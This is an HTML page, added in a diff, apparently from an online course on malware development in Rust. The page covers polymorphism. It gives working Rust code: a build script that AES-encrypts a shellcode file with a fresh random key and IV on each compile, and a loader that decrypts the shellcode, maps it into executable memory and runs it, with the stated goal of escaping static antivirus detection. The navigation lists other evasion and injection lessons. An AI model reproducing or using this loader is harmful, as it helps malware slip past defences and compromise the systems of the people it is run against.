@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+      
+    
+
+      <title>Malware development in Rust</title>
+
+      
+      
+
+      <!-- CSS -->
+      
+      <link rel="stylesheet" href=" https://nu11busters.github.io/rust-maldev-course/book.css">
+      
+
+      
+      
+    </head>
+
+    <body>
+        <div class="menu">
+            
+            
+            <nav role="navigation">
+                <ul>
+                    
+                        
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/home/">
+                                    
+                                    Malware development in Rust
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/about/">
+                                    
+                                    About us
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/">
+                                    
+                                    Cargo
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/optimise/">
+                                                    
+                                                    Optimise Cargo
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/cross-compilation/">
+                                                    
+                                                    Cross-compilation
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/dynamic-library/">
+                                                    
+                                                    Dynamic library
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/">
+                                    
+                                    System APIs
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/windows-api/">
+                                                    
+                                                    Windows API
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/libc-api/">
+                                                    
+                                                    Libc API
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/">
+                                    
+                                    Cryptography
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/intro/">
+                                                    
+                                                    Introduction
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/rsa/">
+                                                    
+                                                    Asymmetric encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/aes/">
+                                                    
+                                                    Symmetric encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/sha256/">
+                                                    
+                                                    Hashing
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/df/">
+                                                    
+                                                    Diffie-Hellman
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/sockets/">
+                                                    
+                                                    Sockets with OpenSSL
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/">
+                                    
+                                    Code injection
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/injection-with-ptrace/">
+                                                    
+                                                    Injection with PTRACE
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/">
+                                                    
+                                                    CreateRemoteThread
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/process-hollowing/">
+                                                    
+                                                    Process Hollowing
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/">
+                                    
+                                    Obfuscation
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/strings/">
+                                                    
+                                                    Strings encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li class="active">
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/polymorphism/">
+                                                    
+                                                    Polymorphism
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/metamorphism/">
+                                                    
+                                                    Metamorphism
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/auto-remove/">
+                                                    
+                                                    Self deletion
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/dynamic-imports/">
+                                                    
+                                                    Dynamic imports
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/">
+                                    
+                                    Evasion
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/query-wmi/">
+                                                    
+                                                    Query wmi
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-ptrace/">
+                                                    
+                                                    Anti-debug with PTRACE
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-isdebuggerpresent/">
+                                                    
+                                                    IsDebuggerPresent
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/detect-sandbox/">
+                                                    
+                                                    Detect sandbox
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/fileless-execution/">
+                                                    
+                                                    Fileless on Linux
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/direct-syscalls/">
+                                                    
+                                                    Direct syscall
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/hook-detection/">
+                                                    
+                                                    Hook detection
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/hells/">
+                                                    
+                                                    Hell&#x27;s Gate
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/patch-etw/">
+                                                    
+                                                    Patch ETW
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/">
+                                    
+                                    Shellcode
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/call-assembly-in-rust/">
+                                                    
+                                                    Call assembly in Rust
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/exec-shellcode-in-local/">
+                                                    
+                                                    Execute shellcode in local process
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-linux/">
+                                                    
+                                                    Generate shellcode for Linux
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-windows/">
+                                                    
+                                                    Generate shellcode for Windows
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/conclusion/">
+                                    
+                                    Conclusion
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/credits/">
+                                    
+                                    Credits and ressources
+                                </a>
+                                
+                            </li>
+                        
+                    
+                </ul>
+            </nav>
+            
+            
+        </div>
+
+        <div class="page">
+            <div class="page__header">
+                <div class="menu-icon">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                
+                <span class="search-icon">🔎</span>
+                
+            </div>
+
+            <div class="page__content">
+                
+                <div class="search-container">
+                    <input id="search" type="search" placeholder="Search..">
+                    <div class="search-results">
+                        <div class="search-results__header"></div>
+                        <ul class="search-results__items"></ul>
+                    </div>
+                </div>
+                
+                <div class="book-content">
+                    
+    <h1>Polymorphism</h1>
+    <p>Polymorphic malware consists of a binary that constantly changes its content, while retaining the same functionality. This makes them invisible to detection based on file signatures.</p>
+<p>Think of our malware as tigers whose stripes are constantly changing position.</p>
+<p>For our polymorphism implementation, we're going to develop a program that executes a shellcode whose contents are used to display a command prompt.</p>
+<p>This shellcode will be AES encrypted in the program's memory, using a key and an IV that will be randomly regenerated each time the binary is compiled, hence the polymorphic nature of our malware.</p>
+<p>Our example will be compiled for Linux, but all functionalities are fully cross-platform to Windows.</p>
+<p>Here's the structure of our project:</p>
+<pre style="background-color:#eff1f5;color:#4f5b66;"><code><span>.
+</span><span>├── build.rs
+</span><span>├── Cargo.lock
+</span><span>├── Cargo.toml
+</span><span>├── shellcode.bin
+</span><span>└── src
+</span><span> ├── binaries
+</span><span> │   ├── encrypted_shellcode.bin
+</span><span> │   ├── iv.bin
+</span><span> │   └── key.bin
+</span><span> └── main.rs
+</span></code></pre>
+<h2 id="cargo-build-scripts">Cargo build scripts<a class="zola-anchor" href="#cargo-build-scripts" aria-label="Anchor link for: cargo-build-scripts">🔗</a></h2>
+<p>The Cargo tool suite provides us with the ability to develop &quot;scripts&quot; in Rust that will be executed upstream of the compilation of our main program.</p>
+<p>This feature has been developed in particular to be able to compile C code when our Rust code depends on it, but we're going to use it to generate our encryption key, IV and to encrypt our shellcode.</p>
+<p>To define a build script, we need to add the following line to our Cargo.toml file:</p>
+<pre data-lang="toml" style="background-color:#eff1f5;color:#4f5b66;" class="language-toml "><code class="language-toml" data-lang="toml"><span>
+</span><span>[package]
+</span><span style="background-color:#bf616a;color:#eff1f5;">...</span><span>
+</span><span style="color:#bf616a;">package </span><span>= &quot;</span><span style="color:#a3be8c;">build.rs</span><span>&quot;
+</span><span>
+</span><span>[dependencies]
+</span><span style="color:#bf616a;">libc </span><span>= &quot;</span><span style="color:#a3be8c;">0.2</span><span>&quot;
+</span><span style="color:#bf616a;">libaes </span><span>= &quot;</span><span style="color:#a3be8c;">0.7</span><span>&quot;
+</span><span>
+</span><span>[build-dependencies]
+</span><span style="color:#bf616a;">libaes </span><span>= &quot;</span><span style="color:#a3be8c;">0.7</span><span>&quot;
+</span><span style="color:#bf616a;">rand </span><span>= &quot;</span><span style="color:#a3be8c;">0.8</span><span>&quot;
+</span></code></pre>
+<p>Here, we tell Cargo to run the <code>build.rs</code> script before starting to compile the program. Next, we fill in the dependencies of our program, and finally, we fill in the dependencies used only in the context of the &quot;build script&quot;.</p>
+<p>As the <em>build.rs</em> file is the Rust script that will be executed during pre-compilation, here are its contents:</p>
+<pre data-lang="rust" style="background-color:#eff1f5;color:#4f5b66;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#b48ead;">use </span><span>libaes::Cipher;
+</span><span style="color:#b48ead;">use </span><span>rand::RngCore;
+</span><span style="color:#b48ead;">use </span><span>std::fs;
+</span><span>
+</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>    </span><span style="color:#b48ead;">let</span><span> src_path = &quot;</span><span style="color:#a3be8c;">shellcode.bin</span><span>&quot;;
+</span><span>    </span><span style="color:#b48ead;">let</span><span> dst_path = &quot;</span><span style="color:#a3be8c;">src/binaries/encrypted_shellcode.bin</span><span>&quot;;
+</span><span>    </span><span style="color:#b48ead;">let</span><span> key_path = &quot;</span><span style="color:#a3be8c;">src/binaries/key.bin</span><span>&quot;;
+</span><span>    </span><span style="color:#b48ead;">let</span><span> iv_path = &quot;</span><span style="color:#a3be8c;">src/binaries/iv.bin</span><span>&quot;;
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">let mut</span><span> key = [</span><span style="color:#d08770;">0</span><span style="color:#b48ead;">u8</span><span>; </span><span style="color:#d08770;">32</span><span>];
+</span><span>    </span><span style="color:#b48ead;">let mut</span><span> iv = [</span><span style="color:#d08770;">0</span><span style="color:#b48ead;">u8</span><span>; </span><span style="color:#d08770;">32</span><span>];
+</span><span>
+</span><span>    rand::thread_rng().</span><span style="color:#96b5b4;">fill_bytes</span><span>(&amp;</span><span style="color:#b48ead;">mut</span><span> key);
+</span><span>    rand::thread_rng().</span><span style="color:#96b5b4;">fill_bytes</span><span>(&amp;</span><span style="color:#b48ead;">mut</span><span> iv);
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">let</span><span> cipher = Cipher::new_256(&amp;key);
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">let</span><span> encrypted = cipher.</span><span style="color:#96b5b4;">cbc_encrypt</span><span>(&amp;iv, &amp;fs::read(src_path).</span><span style="color:#96b5b4;">unwrap</span><span>());
+</span><span>    fs::write(dst_path, encrypted).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>    fs::write(key_path, key).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>    fs::write(iv_path, iv).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>}
+</span></code></pre>
+<p>In this script, we start by defining the paths to the files we're going to use, including the original shellcode whose contents we're going to retrieve, and then the location of the encrypted shellcode as well as the key and IV that go with it, in the project's source code.</p>
+<p>We then initialize two buffers, one for the key and one for the IV, which we'll fill with random characters.</p>
+<p>We now have what we need to encrypt our shellcode and store everything in its proper place so that it can be loaded by our program.</p>
+<h2 id="executing-the-shellcode">Executing the shellcode<a class="zola-anchor" href="#executing-the-shellcode" aria-label="Anchor link for: executing-the-shellcode">🔗</a></h2>
+<p>We'll now describe how to load the previously generated files into our program and then decrypt and call shellcode at runtime:</p>
+<pre data-lang="rust" style="background-color:#eff1f5;color:#4f5b66;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#b48ead;">use </span><span>libaes::Cipher;
+</span><span style="color:#b48ead;">use </span><span>libc::mmap;
+</span><span style="color:#b48ead;">use </span><span>libc::{mprotect, </span><span style="color:#d08770;">MAP_ANON</span><span>, </span><span style="color:#d08770;">MAP_PRIVATE</span><span>, </span><span style="color:#d08770;">PROT_EXEC</span><span>, </span><span style="color:#d08770;">PROT_READ</span><span>, </span><span style="color:#d08770;">PROT_WRITE</span><span>};
+</span><span style="color:#b48ead;">use </span><span>std::{mem, ptr};
+</span><span>
+</span><span style="color:#b48ead;">static </span><span style="color:#d08770;">SHELLCODE</span><span>: &amp;[</span><span style="color:#b48ead;">u8</span><span>] = include_bytes!(&quot;</span><span style="color:#a3be8c;">binaries/encrypted_shellcode.bin</span><span>&quot;);
+</span><span style="color:#b48ead;">static </span><span style="color:#d08770;">KEY</span><span>: &amp;[</span><span style="color:#b48ead;">u8</span><span>; </span><span style="color:#d08770;">32</span><span>] = include_bytes!(&quot;</span><span style="color:#a3be8c;">binaries/key.bin</span><span>&quot;);
+</span><span style="color:#b48ead;">static </span><span style="color:#d08770;">IV</span><span>: &amp;[</span><span style="color:#b48ead;">u8</span><span>; </span><span style="color:#d08770;">32</span><span>] = include_bytes!(&quot;</span><span style="color:#a3be8c;">binaries/iv.bin</span><span>&quot;);
+</span><span>
+</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>    </span><span style="color:#b48ead;">let</span><span> cipher = Cipher::new_256(</span><span style="color:#d08770;">KEY</span><span>);
+</span><span>    </span><span style="color:#b48ead;">let</span><span> decrypted = cipher.</span><span style="color:#96b5b4;">cbc_decrypt</span><span>(</span><span style="color:#d08770;">IV</span><span>, </span><span style="color:#d08770;">SHELLCODE</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">unsafe </span><span>{
+</span><span>        </span><span style="color:#b48ead;">let</span><span> map = </span><span style="color:#96b5b4;">mmap</span><span>(
+</span><span>            ptr::null_mut(),
+</span><span>            </span><span style="color:#d08770;">4096</span><span>,
+</span><span>            </span><span style="color:#d08770;">PROT_READ </span><span>| </span><span style="color:#d08770;">PROT_WRITE</span><span>,
+</span><span>            </span><span style="color:#d08770;">MAP_PRIVATE </span><span>| </span><span style="color:#d08770;">MAP_ANON</span><span>,
+</span><span>            -</span><span style="color:#d08770;">1</span><span>,
+</span><span>            </span><span style="color:#d08770;">0</span><span>,
+</span><span>        );
+</span><span>
+</span><span>        ptr::copy(decrypted.</span><span style="color:#96b5b4;">as_ptr</span><span>(), map as </span><span style="color:#b48ead;">*mut u8</span><span>, decrypted.</span><span style="color:#96b5b4;">len</span><span>());
+</span><span>
+</span><span>        </span><span style="color:#96b5b4;">mprotect</span><span>(map, </span><span style="color:#d08770;">4096</span><span>, </span><span style="color:#d08770;">PROT_READ </span><span>| </span><span style="color:#d08770;">PROT_EXEC</span><span>);
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">let</span><span> exec_shellcode: </span><span style="color:#b48ead;">extern </span><span>&quot;</span><span style="color:#a3be8c;">C</span><span>&quot; </span><span style="color:#b48ead;">fn</span><span>() -&gt; ! = mem::transmute(map);
+</span><span>        </span><span style="color:#96b5b4;">exec_shellcode</span><span>();
+</span><span>    }
+</span><span>}
+</span></code></pre>
+<p>Here, we start by loading the contents of the encrypted shellcode, the key and the IV into their respective static variables at compile time.</p>
+<p>We then proceed to decrypt the shellcode in memory. The rest of the program follows the same principle as the local shellcode execution we saw earlier in the course.</p>
+<p>By compiling our program twice in succession and calculating the hash of the executable, we can see that there are different contents each time:</p>
+<p><img src="../polymorphism_build.png" alt="" /></p>
+<h2 id="conclusion">Conclusion<a class="zola-anchor" href="#conclusion" aria-label="Anchor link for: conclusion">🔗</a></h2>
+<p>You now know how to implement polymorphism in your malware and thus escape static antivirus detection. Depending on your creativity, there are other possible implementations than the one demonstrated here, but the idea remains the same.</p>
+<p>The next part of the course deals with metamorphism, which takes the same principle to a higher level. </p>
+
+
+                </div>
+            </div>
+
+            <div class="prev-link">
+                
+    
+        
+        
+        <a class="previous" href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/"><</a>
+    
+
+            </div>
+
+            <div class="next-link">
+                
+    
+        <a class="next" href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/metamorphism/">></a>
+    
+
+            </div>
+        </div>
+
+        
+            
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/elasticlunr.min.js"></script>
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/search_index.en.js"></script>
+            
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/book.js"></script>
+        
+    </body>
+
+</html>
